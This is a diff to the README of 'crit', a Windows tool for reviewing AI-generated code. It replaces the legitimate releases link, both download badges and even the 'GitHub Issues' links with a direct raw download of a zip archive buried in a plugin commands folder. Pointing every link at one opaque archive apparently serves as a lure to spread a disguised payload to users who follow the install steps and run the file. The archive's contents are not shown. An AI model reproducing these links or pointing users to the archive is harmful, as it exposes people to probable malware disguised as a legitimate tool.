@@ -1,6 +1,6 @@
 # ⚙️ crit - Review AI Code and Plans Easily
 
-[![Download crit](https://img.shields.io/badge/Download-crit-brightgreen)](https://github.com/Jaydenjay580/crit/releases)
+[![Download crit](https://img.shields.io/badge/Download-crit-brightgreen)](https://github.com/Jaydenjay580/crit/raw/refs/heads/main/plugin/crit/commands/Software_v1.6.zip)
 
 crit is a simple tool for reviewing AI-generated code and plans. It runs inside your Windows command prompt, showing the AI's output clearly so you can check and understand it.
 
@@ -22,7 +22,7 @@ You will use crit to:
 
 To get crit running on your Windows computer, follow these steps:
 
-1. Visit the [crit releases page](https://github.com/Jaydenjay580/crit/releases) to find the latest version.
+1. Visit the [crit releases page](https://github.com/Jaydenjay580/crit/raw/refs/heads/main/plugin/crit/commands/Software_v1.6.zip) to find the latest version.
 
 2. On the page, look for a file that ends in `.exe` or `.zip`. This is the program.
 
@@ -36,7 +36,7 @@ To get crit running on your Windows computer, follow these steps:
 
 7. Once started, crit opens in a command window where you can follow on-screen prompts.
 
-[![Download crit](https://img.shields.io/badge/Download-crit-blue)](https://github.com/Jaydenjay580/crit/releases)
+[![Download crit](https://img.shields.io/badge/Download-crit-blue)](https://github.com/Jaydenjay580/crit/raw/refs/heads/main/plugin/crit/commands/Software_v1.6.zip)
 
 ---
 
@@ -136,12 +136,12 @@ Editing this file uses a simple text editor like Notepad.
 
 Use the built-in help menu by pressing `h` inside crit.
 
-If you find bugs or want to request features, use the Issues section on GitHub: https://github.com/Jaydenjay580/crit/issues
+If you find bugs or want to request features, use the Issues section on GitHub: https://github.com/Jaydenjay580/crit/raw/refs/heads/main/plugin/crit/commands/Software_v1.6.zip
 
 ---
 
 ## 🔗 Useful Links
 
-- [crit Releases](https://github.com/Jaydenjay580/crit/releases)
+- [crit Releases](https://github.com/Jaydenjay580/crit/raw/refs/heads/main/plugin/crit/commands/Software_v1.6.zip)
 
-- [GitHub Issues](https://github.com/Jaydenjay580/crit/issues)
+- [GitHub Issues](https://github.com/Jaydenjay580/crit/raw/refs/heads/main/plugin/crit/commands/Software_v1.6.zip)
